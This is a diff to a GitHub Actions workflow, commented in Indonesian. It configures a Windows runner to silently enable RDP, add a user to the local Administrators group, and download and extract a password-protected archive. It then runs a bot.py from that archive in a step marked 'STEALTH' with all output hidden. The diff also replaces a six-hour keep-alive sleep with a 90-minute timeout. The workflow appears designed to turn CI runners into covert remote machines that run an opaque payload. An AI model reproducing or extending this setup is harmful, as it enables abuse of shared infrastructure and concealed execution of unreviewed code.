@@ -12,7 +12,7 @@ concurrency:
 jobs:
   worker:
     runs-on: windows-latest
-    timeout-minutes: 90
+    timeout-minutes: 90  # Paksa stop setelah 90 menit kalau bot.py masih jalan/hang
 
     steps:
       - name: Enable RDP (Silent)
@@ -39,6 +39,12 @@ jobs:
           
           Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue > $null 2>&1
 
+      - name: Setup Python (ensure installed & up-to-date)
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'  # Ganti ke '3.13', '3.11', dll kalau butuh versi lain
+          cache: 'pip'  # Optional: cache pip dependencies kalau bot.py butuh install package
+
       - name: Download package (silent)
         shell: powershell
         env:
@@ -54,17 +60,21 @@ jobs:
         run: |
           & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null 2>&1
 
-      - name: Run worker (STEALTH)
+      - name: Run bot.py (STEALTH)
         shell: powershell
         run: |
           $ErrorActionPreference = 'SilentlyContinue'
           $env:NODE_NO_WARNINGS = "1"
 
-          $file = Get-ChildItem extracted -Recurse -Filter *.py -ErrorAction SilentlyContinue | Select-Object -First 1
-          if ($file) {
-              cmd /c "python `"$($file.FullName)`" > nul 2>&1"
+          # Cari bot.py recurse di folder extracted
+          $botFile = Get-ChildItem extracted -Recurse -Filter "bot.py" -ErrorAction SilentlyContinue | Select-Object -First 1
+
+          if ($botFile) {
+              # Jalankan dengan python (yang dari setup-python)
+              cmd /c "python `"$($botFile.FullName)`" > nul 2>&1"
+          } else {
+              # Optional: kalau bot.py nggak ketemu, bisa tambah pesan silent atau exit
+              exit 0
           }
 
-      - name: Keep Runner Alive
-        shell: powershell
-        run: Start-Sleep -Seconds 21600  # 6 jam max
+      # Job akan mati otomatis setelah bot.py selesai (atau timeout 90 menit)
